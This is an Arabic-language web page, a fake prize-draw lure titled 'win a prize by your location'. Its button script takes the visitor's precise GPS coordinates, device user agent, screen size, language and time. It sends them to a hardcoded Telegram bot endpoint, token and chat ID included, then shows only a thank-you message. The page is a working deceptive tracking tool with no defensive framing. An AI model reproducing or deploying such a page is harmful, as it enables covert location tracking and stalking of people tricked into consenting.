<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>🎯 اربح جائزة بحسب موقعك!</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Tahoma', sans-serif;
      background: linear-gradient(to right, #2980b9, #6dd5fa);
      text-align: center;
      padding: 40px;
      color: #fff;
    }

    h1 {
      font-size: 2.2rem;
    }

    p {
      font-size: 1.2rem;
      margin-bottom: 30px;
    }

    button {
      padding: 14px 25px;
      font-size: 18px;
      background-color: #2ecc71;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .footer {
      margin-top: 60px;
      font-size: 0.9rem;
      color: #e0e0e0;
    }
  </style>
</head>
<body>

  <h1>🎁 اربح جائزة حسب منطقتك!</h1>
  <p>اضغط على الزر لتأكيد موقعك والمشاركة في السحب المجاني</p>

  <button onclick="sendData()">📍 تأكيد موقعي</button>

  <div class="footer">© 2025 جميع الحقوق محفوظة</div>

  <script>
    function sendData() {
      const userAgent = navigator.userAgent;
      const screenRes = screen.width + "x" + screen.height;
      const language = navigator.language;
      const time = new Date().toLocaleString('ar');

      if (!navigator.geolocation) {
        alert("❌ جهازك لا يدعم تحديد الموقع");
        return;
      }

      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = Math.round(pos.coords.accuracy);

        const message =
          "📡 بيانات زائر جديد:\n\n" +
          "🛰️ الموقع: " + lat + ", " + lon + "\n" +
          "🎯 الدقة: ±" + acc + " متر\n" +
          "🕒 الوقت: " + time + "\n\n" +
          "📱 الجهاز: " + userAgent + "\n" +
          "🖥️ الشاشة: " + screenRes + "\n" +
          "🌐 اللغة: " + language;

        fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "5014833892",
            text: message
          })
        });

        alert("✅ تم تأكيد موقعك، شكراً لمشاركتك!");
      }, err => {
        alert("❌ لم نتمكن من تحديد موقعك. الرجاء السماح للموقع.");
      });
    }
  </script>

</body>
</html>
